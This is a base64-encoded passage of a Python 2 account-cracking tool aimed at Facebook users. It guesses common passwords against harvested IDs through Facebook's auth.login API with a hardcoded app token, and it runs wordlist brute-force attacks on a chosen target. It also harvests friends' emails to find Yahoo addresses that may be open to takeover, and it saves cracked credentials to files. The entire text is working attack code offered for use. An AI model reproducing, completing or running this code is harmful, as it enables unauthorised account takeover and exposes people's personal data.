wYXNzd29yZDEyMyIsIm1pY2hlbGxlIiwic29tZW9uZSIsIiIsImlsb3ZleW91IiwicHJpbmNlc3MiLCJwbGF5Ym95Ig0KCQkJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQkJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpDQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczcrIiA9PiIrelsnbmFtZSddKQ0KCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNykNCgkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJCQljaGVja19pdC53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJCQljaGVja19pdC5jbG9zZSgpDQoJCQkJCQkJCQkJCQkJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1Bhc3M4DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYiA9IGpzb24ubG9hZHMoYS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzOCA9ICJqYW51YXJ5IiwiZmVicnVhcnkiLCJtYXJjaCIsImFwcmlsIiwibWF5IiwianVuZSIsImp1bHkiLCJhdWd1c3QiLCJzZXB0ZW1iZXIiLCJub3ZlbWJlciIsImRlY2VtYmVyIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczgpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3M4KyIgPT4iK3pbJ25hbWUnXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIrcGFzczgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tfaXQgPSBvcGVuKCJvdXQvb3V0cHV0LnR4dCIsICJhIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3M4KyJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja19pdC5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M4KQ0KDQoJCWV4Y2VwdDoNCgkJCXBhc3MNCg0KCXAgPSBUaHJlYWRQb29sKDMwKQ0KCXAubWFwKG1haW4sIGlkKQ0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRG9uZSBcMDMzWzE7OTdtLi4uLicNCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBPSy9DUCBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIitzdHIobGVuKG9rcykpKyJcMDMzWzE7OTdtL1wwMzNbMTs5M20iK3N0cihsZW4oY2hlY2twb2ludCkpDQoJcHJpbnQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNQIEZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC9vdXRwdXQudHh0IikNCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCXN1cGVyKCkNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQojIyMjIyBCUlVURSBGT1JDRSAjIyMjIw0KZGVmIGJydXRlKCk6DQoJZ2xvYmFsIGZiX3Rva2VuDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJdHJ5Og0KCQllbWFpbCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSURcMDMzWzE7OTdtL1wwMzNbMTs5Mm1FbWFpbFwwMzNbMTs5N20vXDAzM1sxOzkybUhwIFwwMzNbMTs5N21UYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpDQoJCXBhc3N3ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Xb3JkbGlzdCBcMDMzWzE7OTdtZXh0KGxpc3QudHh0KSBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikNCgkJdG90YWwgPSBvcGVuKHBhc3N3LCJyIikNCgkJdG90YWwgPSB0b3RhbC5yZWFkbGluZXMoKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbA0KCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWxcMDMzWzE7OTZtICIrc3RyKGxlbih0b3RhbCkpKyIgXDAzM1sxOzkybVBhc3N3b3JkIg0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCgkJc2FuZGkgPSBvcGVuKHBhc3N3LCJyIikNCgkJZm9yIHB3IGluIHNhbmRpOg0KCQkJdHJ5Og0KCQkJCXB3ID0gcHcucmVwbGFjZSgiXG4iLCIiKQ0KCQkJCXN5cy5zdGRvdXQud3JpdGUoIlxyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4py4XDAzM1sxOzkxbV0gXDAzM1sxOzkybUNyYWNrIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3B3KQ0KCQkJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhlbWFpbCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCW1wc2ggPSBqc29uLmxvYWRzKGRhdGEudGV4dCkNCgkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOg0KCQkJCQlkYXBhdCA9IG9wZW4oIkJydXRlLnR4dCIsICJ3IikNCgkJCQkJZGFwYXQud3JpdGUoZW1haWwrIiB8ICIrcHcrIlxuIikNCgkJCQkJZGFwYXQuY2xvc2UoKQ0KCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2VtYWlsKQ0KCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykNCgkJCQkJZXhpdCgpDQoJCQkJZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06DQoJCQkJCWNla3MgPSBvcGVuKCJCcnV0ZWNoZWNrcG9pbnQudHh0IiwgInciKQ0KCQkJCQljZWtzLndyaXRlKGVtYWlsKyIgfCAiK3B3KyJcbiIpDQoJCQkJCWNla3MuY2xvc2UoKQ0KCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2VtYWlsKQ0KCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykNCgkJCQkJZXhpdCgpDQoJCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBDb25uZWN0aW9uIEVycm9yIg0KCQkJCXRpbWUuc2xlZXAoMC4wMSkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikNCgkJd29yZGxzdCgpDQpkZWYgd29yZGxzdCgpOg0KCXdoeSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtQ3JlYXRlIHdvcmRsaXN0ID8gXDAzM1sxOzkybVt5L25dXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpDQoJaWYgd2h5ID09IiI6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIg0KCQl3b3JkbHN0KCkNCgllbGlmIHdoeSA9PSJ5IjoNCgkJd29yZGxpc3QoKQ0KCWVsaWYgd2h5ID09IlkiOg0KCQl3b3JkbGlzdCgpDQoJZWxpZiB3aHkgPT0ibiI6DQoJCW1lbnVfaGFjaygpDQoJZWxpZiB3aHkgPT0iTiI6DQoJCW1lbnVfaGFjaygpDQoJZWxzZToNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciDQoJCXdvcmRsc3QoKQ0KDQojIyMjIyBZQUhPTyBDSEVDS0VSICMjIyMjDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIw0KZGVmIG1lbnVfeWFob28oKToNCglnbG9iYWwgZmJfdG9rZW4NCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBXaXRoIGxpc3QgZnJpZW5kIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIENsb25lIGZyb20gZnJpZW5kIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENsb25lIGZyb20gbWVtYmVyIGdyb3VwIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIFVzaW5nIGZpbGUiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayINCglwcmludCAi4pWRIg0KCWNob29zZV95YWhvbygpDQojLS0tLWNob2ljZXMNCmRlZiBjaG9vc2VfeWFob28oKToNCglnbyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQ0KCWlmIGdvID09IiI6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIg0KCQljaG9vc2VfeWFob28oKQ0KCWVsaWYgZ28gPT0iMSI6DQoJCXlhaG9vZnJpZW5kcygpDQoJZWxpZiBnbyA9PSIyIjoNCgkJeWFob29mcm9tZnJpZW5kcygpDQoJZWxpZiBnbyA9PSIzIjoNCgkJeWFob29tZW1iZXIoKQ0KCWVsaWYgZ28gPT0iNCI6DQoJCXlhaG9vbGlzdCgpDQoJZWxpZiBnbyA9PSIwIjoNCgkJbWVudV9oYWNrKCkNCgllbHNlOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyINCgkJY2hvb3NlX3lhaG9vKCkNCg0KIyMjIyMgTElTVCBGUklFTkQgIyMjIyMNCmRlZiB5YWhvb2ZyaWVuZHMoKToNCglnbG9iYWwgZmJfdG9rZW4NCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3MubWtkaXIoJ291dCcpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCXBhc3MNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJbXBzaCA9IFtdDQoJamNzYiA9IDANCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXR0aW5nIGVtYWlsIGZyaWVuZCBcMDMzWzE7OTdtLi4uJykNCglmcmllbmRzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCW1pdGNoeSA9IGpzb24ubG9hZHMoZnJpZW5kcy50ZXh0KQ0KCXNhdmUgPSBvcGVuKCdvdXQvTWFpbFZ1bG4udHh0JywndycpDQoJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpDQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJZm9yIHcgaW4gbWl0Y2h5WydkYXRhJ106DQoJCWpjc2IgKz0xDQoJCW1wc2guYXBwZW5kKGpjc2IpDQoJCWlkID0gd1snaWQnXQ0KCQlmYl9uYW1lID0gd1snbmFtZSddDQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCXogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpDQoJCXRyeToNCgkJCW1haWwgPSB6WydlbWFpbCddDQoJCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQ0KCQkJb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkNCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoNCgkJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpDQoJCQkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUNCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQ0KCQkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbA0KCQkJCWNsaWNrID0gYnIuc3VibWl0KCkucmVhZCgpDQoJCQkJc2VhdCA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQ0KCQkJCXRyeToNCgkJCQkJcGlja3MgPSBzZWF0LnNlYXJjaChjbGljaykuZ3JvdXAoKQ0KCQkJCWV4Y2VwdDoNCgkJCQkJY29udGludWUNCgkJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGlja3M6DQoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpDQoJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCsiIFwwMzNbMTs5N209PiIrZmJfbmFtZSkNCgkJCQkJc3VjZXNzZnVsLmFwcGVuZChtYWlsKQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwYXNzDQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJw0KCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3N0cihsZW4oc3VjZXNzZnVsKSkNCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvTWFpbFZ1bG4udHh0Ig0KCXNhdmUuY2xvc2UoKQ0KCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJbWVudV95YWhvbygpDQoNCiMjIyMjIENMT05FIEZST00gRlJJRU5EICMjIyMjDQpkZWYgeWFob29mcm9tZnJpZW5kcygpOg0KCWdsb2JhbCBmYl90b2tlbg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvcy5ta2Rpcignb3V0JykNCglleGNlcHQgT1NFcnJvcjoNCgkJcGFzcw0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCgltcHNoID0gW10NCglqY3NiID0gMA0KCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQ0KCXRyeToNCgkJc2VhdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJb3AgPSBqc29uLmxvYWRzKHNlYXQudGV4dCkNCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBGcmllbmQgbm90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQltZW51X3lhaG9vKCkNCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXR0aW5nIGVtYWlsIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQ0KCWZyaWVuZHMgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgltaXRjaHkgPSBqc29uLmxvYWRzKGZyaWVuZHMudGV4dCkNCglzYXZlID0gb3Blbignb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCcsJ3cnKQ0KCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQ0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCWZvciB3IGluIG1pdGNoeVsnZGF0YSddOg0KCQlqY3NiICs9MQ0KCQltcHNoLmFwcGVuZChqY3NiKQ0KCQlpZCA9IHdbJ2lkJ10NCgkJZmJfbmFtZSA9IHdbJ25hbWUnXQ0KCQlsaW5rcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZCsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQl6ID0ganNvbi5sb2FkcyhsaW5rc